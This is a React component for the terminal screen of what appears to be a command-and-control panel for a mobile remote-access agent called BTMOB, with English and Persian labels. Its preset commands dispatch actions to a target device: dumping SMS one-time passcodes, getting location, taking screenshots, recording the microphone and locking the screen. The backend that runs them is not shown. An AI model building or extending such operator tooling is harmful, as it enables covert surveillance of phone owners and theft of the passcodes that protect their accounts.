import React, { useState, useRef, useEffect } from 'react';
import { useDashboard } from '../../context/DashboardContext';
import { Terminal, Send, Trash2, HelpCircle, Smartphone, Play } from 'lucide-react';
import { t } from '../../utils/translations';

export const TerminalView: React.FC = () => {
  const { 
    lang, 
    commandHistory, 
    executeCommand, 
    selectedDevice 
  } = useDashboard();

  const labels = t[lang];
  const [inputCmd, setInputCmd] = useState('');
  const terminalBottomRef = useRef<HTMLDivElement>(null);

  const presets = [
    { label: 'help', cmd: 'help' },
    { label: 'dump_sms', cmd: 'dump_sms --otp-only' },
    { label: 'get_location', cmd: 'get_location' },
    { label: 'take_screenshot', cmd: 'take_screenshot' },
    { label: 'lock_screen', cmd: 'lock_screen' },
    { label: 'record_mic 15s', cmd: 'record_mic 15s' },
    { label: 'quarantine', cmd: 'quarantine' },
    { label: 'clear', cmd: 'clear' }
  ];

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!inputCmd.trim()) return;
    executeCommand(inputCmd);
    setInputCmd('');
  };

  const handleRunPreset = (cmd: string) => {
    executeCommand(cmd);
  };

  useEffect(() => {
    terminalBottomRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [commandHistory]);

  return (
    <div className="space-y-6">
      {/* Top Header */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 border-b border-slate-800/60 pb-4">
        <div>
          <h1 className="text-xl font-bold tracking-tight text-white flex items-center gap-2">
            <Terminal className="w-5 h-5 text-cyan-400" />
            <span>{labels.navTerminal}</span>
          </h1>
          <p className="text-xs text-slate-400 mt-1">
            {lang === 'fa' 
              ? 'ترمینال تعاملی ارسال دستورات به مامور BTMOB و اجرای دستورات مستقیم شل' 
              : 'Interactive C2 shell terminal for real-time agent dispatch and ADB execution'}
          </p>
        </div>

        <div className="flex items-center gap-2 text-xs text-slate-400 bg-slate-900 border border-slate-800 px-3 py-1.5 rounded-lg font-mono">
          <Smartphone className="w-3.5 h-3.5 text-cyan-400" />
          <span>Target: {selectedDevice?.id} ({selectedDevice?.name})</span>
        </div>
      </div>

      {/* Preset Command Shortcuts */}
      <div className="p-3 bg-slate-900/60 border border-slate-800/80 rounded-xl space-y-2">
        <div className="text-[11px] font-medium text-slate-400 uppercase tracking-wider flex items-center gap-1.5">
          <HelpCircle className="w-3.5 h-3.5 text-cyan-400" />
          <span>{lang === 'fa' ? 'دستورات پرتکرار و میان‌بر C2' : 'Quick C2 Preset Commands'}</span>
        </div>
        <div className="flex flex-wrap gap-1.5">
          {presets.map(p => (
            <button
              key={p.cmd}
              onClick={() => handleRunPreset(p.cmd)}
              className="px-2.5 py-1 rounded bg-slate-950 hover:bg-slate-800 text-slate-300 hover:text-cyan-300 border border-slate-800 text-xs font-mono transition-colors cursor-pointer flex items-center gap-1"
            >
              <Play className="w-2.5 h-2.5 fill-current text-cyan-500" />
              <span>{p.label}</span>
            </button>
          ))}
        </div>
      </div>

      {/* Interactive Terminal Window */}
      <div className="rounded-xl bg-slate-950 border border-slate-800 shadow-2xl overflow-hidden font-mono flex flex-col h-[520px]">
        {/* Terminal Header */}
        <div className="px-4 py-2.5 bg-slate-900/80 border-b border-slate-800 flex items-center justify-between text-xs text-slate-400">
          <div className="flex items-center gap-2">
            <div className="flex items-center gap-1.5">
              <span className="w-2.5 h-2.5 rounded-full bg-rose-500/80" />
              <span className="w-2.5 h-2.5 rounded-full bg-amber-500/80" />
              <span className="w-2.5 h-2.5 rounded-full bg-emerald-500/80" />
            </div>
            <span className="text-[11px] text-slate-300 font-semibold ms-2">btmob-agent@{selectedDevice?.id}:~$</span>
          </div>

          <button
            onClick={() => executeCommand('clear')}
            className="text-[11px] hover:text-white transition-colors cursor-pointer flex items-center gap-1"
            title="Clear Terminal"
          >
            <Trash2 className="w-3 h-3" />
            <span>Clear</span>
          </button>
        </div>

        {/* Terminal Logs Viewport */}
        <div className="flex-1 p-4 overflow-y-auto space-y-4 text-xs leading-relaxed text-slate-300" dir="ltr">
          <div className="text-slate-500 text-[11px]">
            [+] Connected to BTMOB C2 Gateway v2.4 (Encrypted TLS session)<br />
            [+] Type 'help' to view available remote administration commands.
          </div>

          {commandHistory.map((item) => (
            <div key={item.id} className="space-y-1">
              <div className="flex items-center gap-2 text-cyan-400 font-semibold">
                <span className="text-slate-500">&gt;</span>
                <span>{item.command}</span>
                <span className="text-[10px] text-slate-500 ms-auto">{item.timestamp}</span>
              </div>
              <pre className="text-slate-300 whitespace-pre-wrap font-mono text-[11px] bg-slate-900/40 p-2.5 rounded border border-slate-800/60">
                {item.output}
              </pre>
            </div>
          ))}
          <div ref={terminalBottomRef} />
        </div>

        {/* Terminal Command Input Form */}
        <form onSubmit={handleSubmit} className="p-3 bg-slate-900/80 border-t border-slate-800 flex items-center gap-2" dir="ltr">
          <span className="text-cyan-400 font-bold">&gt;</span>
          <input
            type="text"
            value={inputCmd}
            onChange={(e) => setInputCmd(e.target.value)}
            placeholder="Type command (e.g. dump_sms, take_screenshot, get_location)..."
            className="flex-1 bg-transparent text-xs text-white placeholder-slate-500 outline-none font-mono"
            autoFocus
          />
          <button
            type="submit"
            className="px-3 py-1 bg-cyan-600 hover:bg-cyan-500 text-slate-950 font-bold text-xs rounded transition-colors cursor-pointer flex items-center gap-1"
          >
            <Send className="w-3 h-3" />
            <span>Exec</span>
          </button>
        </form>
      </div>
    </div>
  );
};
